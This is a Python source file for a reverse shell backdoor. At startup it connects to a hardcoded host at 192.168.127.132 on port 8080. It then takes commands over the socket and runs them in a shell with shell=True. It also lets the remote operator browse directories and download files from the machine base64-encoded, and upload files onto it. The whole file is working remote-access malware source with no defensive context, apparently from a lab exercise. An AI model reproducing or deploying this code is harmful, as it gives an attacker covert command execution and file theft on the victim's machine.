import socket
import subprocess
import simplejson
import os
import base64

class MySocket:
    def __init__(self, ip, port):
        self.my_connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.my_connection.connect((ip, port))
        
    def command_execution(self, command):
        return subprocess.check_output(command, shell=True)
    
    def json_send(self, data):
        json_data = simplejson.dumps(data)
        self.my_connection.send(json_data.encode("utf-8"))
        
    def json_receive(self):
        json_data = ""
        while True:
            try:
                json_data = json_data + self.my_connection.recv(1024).decode()
                return simplejson.loads(json_data)
            except ValueError:
                continue
            
    def execute_cd_command(self, directory):
        os.chdir(directory)
        return "cd to " + directory
    
    def save_file(self, path, content):
        with open(path, "wb") as my_file:
            my_file.write(base64.b64decode(content))
            return "Download OK"
        
    def get_file_content(self, path):
        with open(path, "rb") as my_file:
            return base64.b64encode(my_file.read())
    
    def start_socket(self):
        while True:
            command = self.json_receive()
            try:
                if command[0] == "quit":
                    self.my_connection.close()
                    exit()
                elif command[0] == "cd" and len(command) > 1:
                    command_optput = self.execute_cd_command(command[1])
                elif command[0] == "download":
                    command_optput = self.get_file_content(command[1])
                elif command[0] == "upload":
                    command_optput = self.save_file(command[1], command[2])
                elif command[0] == "pwd":
                    command_optput = os.getcwd()
                elif command[0] == "ls":
                    command_optput = os.listdir()
                else:
                    command_optput = self.command_execution(command)
            except Exception:
                command_optput = "Error!"
            self.json_send(command_optput)
            
        self.my_connection.close()
        
my_socket_object = MySocket("192.168.127.132", 8080)
my_socket_object.start_socket()